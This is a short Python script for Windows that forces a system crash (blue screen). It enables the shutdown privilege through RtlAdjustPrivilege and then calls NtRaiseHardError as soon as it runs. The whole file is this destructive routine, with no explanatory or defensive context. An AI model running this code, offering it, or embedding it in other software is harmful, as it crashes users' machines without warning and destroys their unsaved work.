from ctypes import POINTER, byref, c_int, c_uint, c_ulong, windll

def bsod():
    windll.ntdll.RtlAdjustPrivilege(19, 1, 0, byref(c_int()))
    windll.ntdll.NtRaiseHardError(0xcB50DB50D, 0, POINTER(c_int)(), POINTER(c_int)(), 6, byref(c_uint()))

if __name__ == '__main__':
    bsod()
